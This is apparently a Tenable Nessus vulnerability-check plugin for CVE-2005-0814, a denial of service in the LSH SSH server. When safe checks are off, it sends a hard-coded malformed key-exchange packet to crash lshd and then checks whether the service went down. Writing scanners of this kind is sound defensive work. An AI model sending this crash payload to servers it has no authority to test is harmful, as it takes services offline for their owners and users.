#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(17352);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2005-0814");
 script_bugtraq_id(12829);
 script_osvdb_id(14825);
 
 script_name(english:"LSH lshd parse_kexinit() Function Malformed Key Exchange Message Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SSH server is affected by a denial of service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Lysator's LSH, a version of Secure Shell
(SSH) that is available for Unix-like platforms. This version of LSH
is reportedly vulnerable to a denial of service attack.

An attacker can exploit this issue by sending a malformed key exchange
message." );
 script_set_attribute(attribute:"see_also", value:"http://lists.lysator.liu.se/pipermail/lsh-bugs/2005q1/000328.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LSH 2.0.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
	
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/03/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/16");
 script_cvs_date("$Date: 2013/01/30 18:24:55 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:lysator:lsh");
script_end_attributes();

 
 script_summary(english:"Checks for the remote LSH version");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_dependencie("ssh_detect.nasl");
 script_require_ports("Services/ssh", 22);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/ssh");
if(!port)port = 22;

banner = get_kb_item("SSH/banner/" + port );
if ( ! banner ) exit(0);

if ( "openssh" >< tolower(banner) ) exit(0);

if (safe_checks())
{
 if(ereg(string:banner,
  	pattern:"SSH-2.0-lshd-([01]\..*|2\.0) lsh", icase:TRUE)) security_warning(port);
 exit (0);
}

req = raw_string (
 0x00, 0x00, 0x00, 0xbc, 0x07, 0x14, 0xc1, 0x5f,
 0x45, 0x27, 0x3d, 0x6c, 0x16, 0x7b, 0xf9, 0xc2, 0xca, 0x39, 0x08, 0x61, 0x3b, 0x5a, 0x00, 0x00,
 0x00, 0x3d, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c, 0x6c, 0x6d, 0x61, 0x6e,
 0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x2d, 0x65, 0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x2d,
 0x73, 0x68, 0x61, 0x31, 0x2c, 0x64, 0x69, 0x66, 0x66, 0x69, 0x65, 0x2d, 0x68, 0x65, 0x6c, 0x6c,
 0x6d, 0x61, 0x6e, 0x2d, 0x67, 0x72, 0x6f, 0x75, 0x70, 0x31, 0x2d, 0x73, 0x68, 0x61, 0x31, 0x00,
 0x00, 0x00, 0x0f, 0x73, 0x73, 0x68, 0x2d, 0x72, 0x73, 0x61, 0x2c, 0x73, 0x73, 0x68, 0x2d, 0x64,
 0x73, 0x73, 0x00, 0x00, 0x00, 0x0c, 0x62, 0x6c, 0x6f, 0x77, 0x66, 0x69, 0x73, 0x68, 0x2d, 0x63,
 0x62, 0x63, 0x00, 0x00, 0x00, 0x0c, 0x62, 0x6c, 0x6f, 0x77, 0x66, 0x69, 0x73, 0x68, 0x2d, 0x63,
 0x62, 0x63, 0x00, 0x00, 0x00, 0x09, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31, 0x00,
 0x00, 0x00, 0x09, 0x68, 0x6d, 0x61, 0x63, 0x2d, 0x73, 0x68, 0x61, 0x31, 0x00, 0x00, 0x00, 0x04,
 0x6e, 0x6f, 0x6e, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
);

if (!get_port_state(port)) exit(0);

soc = open_sock_tcp (port);
if (!soc)
  exit (0);

buf = recv_line (socket:soc, length:1024);
if (!buf && ("SSH-2.0-" >!< buf))
  exit (0);

send (socket:soc, data:'SSH-2.0-Crash\n');
buf = recv (socket:soc, length:4096);
if (!buf)
  exit (0);

send (socket:soc, data:req);
close (soc);

soc = open_sock_tcp (port);
if (!soc)
  security_warning(port);
else
  close (soc);
